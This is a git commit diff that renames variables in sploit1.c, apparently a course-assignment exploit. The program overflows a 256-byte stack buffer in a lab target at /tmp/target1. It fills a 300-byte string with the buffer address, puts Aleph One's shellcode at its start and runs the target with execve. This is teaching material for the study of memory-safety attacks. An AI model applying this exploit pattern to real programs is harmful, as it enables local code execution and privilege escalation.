7a0f9b9ec42521881a8fd2b423fc4b27f0d1453c
Rafael Moreno Ferrer <rmferrer@gmail.com>
2013-04-18 13:13:55 -0700

    Prettifying sploit1.c

--- pa/pa1/sploits/sploit1.c
+++ pa/pa1/sploits/sploit1.c
@@ -5,7 +5,7 @@
 #include "shellcode.h"
 
 #define TARGET "/tmp/target1"
-#define STR_SIZE 300 /* size of exploit string, enough to overrun the 256 buffer in target1.c:foo */ 
+#define EGG_SIZE 300 /* size of exploit string, enough to overrun the 256 buffer in target1.c:foo */ 
 
 int main(void)
 {
@@ -16,7 +16,7 @@ int main(void)
   env[0] = NULL;
 
   long buffAddr, *addrPtr;
-  char exploitStr[STR_SIZE]; /* string containing exploit code */
+  char egg[EGG_SIZE]; /* string containing exploit code */
   char *ptr;
   int i;
 
@@ -25,18 +25,18 @@ int main(void)
   /* First fill the exploit string with the address of the buf in foo. 
      This will ensure that we overwrite the return address with the 
      start address of our code */
-  addrPtr = (long *) exploitStr; 
-  for (i = 0; i < STR_SIZE; i += 4)
+  addrPtr = (long *) egg; 
+  for (i = 0; i < EGG_SIZE; i += 4)
     *(addrPtr++) = buffAddr;
   
   /* Then fill the first bytes of the exploit string with
      Aleph One's shellcode */
-  ptr = exploitStr;
+  ptr = egg;
   for (i = 0; i < strlen(shellcode); i++)
     *(ptr++) = shellcode[i];
 
-  exploitStr[STR_SIZE - 1] = 0; /* null terminate exploit string for safety */
-  args[1] = exploitStr;
+  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
+  args[1] = egg;
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
